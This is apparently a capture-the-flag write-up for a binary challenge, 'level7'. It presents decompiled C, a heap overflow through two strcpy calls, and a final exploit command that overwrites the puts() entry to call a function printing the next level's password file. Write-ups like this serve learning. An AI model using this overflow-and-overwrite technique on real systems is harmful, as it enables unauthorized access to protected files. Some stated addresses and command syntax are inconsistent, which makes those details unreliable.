Here is the decompiled code :

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}

undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;

  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

The code is equivalent to this one :
```c
int main(int argc, char **argv) {
    void **obj1 = malloc(8);
    obj1[0] = (void *)1;
    obj1[1] = malloc(8);

    void **obj2 = malloc(8);
    obj2[0] = (void *)2;
    obj2[1] = malloc(8);

    strcpy((char *)obj1[1], argv[1]);
    strcpy((char *)obj2[1], argv[2]);

    FILE *f = fopen("/home/user/level8/.pass", "r");
    char c[0x44];
    fgets(c, 0x44, f);
    puts("~~");

    return 0;
}
```

So strcpy is vulnerable to buffer overflow.
The first strcpy will be used to write inside `puVar3[1]` the address of puts() and the second strcpy will be used to overwrite what's at the address of puts() and replace it by m().

Address of puts() : 0x08048400

We found the offset of the first buffer by finding a pattern with this command : `ltrace ./level7 aaaaaaaaaaaaaaAAAAAAABBB`.

Since we know what we have to do we create the payload :

`./level ([ padding ] + [ addr of puts() ]) ([ addr of m() ])`

`./level7 $(python -c 'print("aaaaaaaaaaaaaaAAAAAb\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")')`

Done
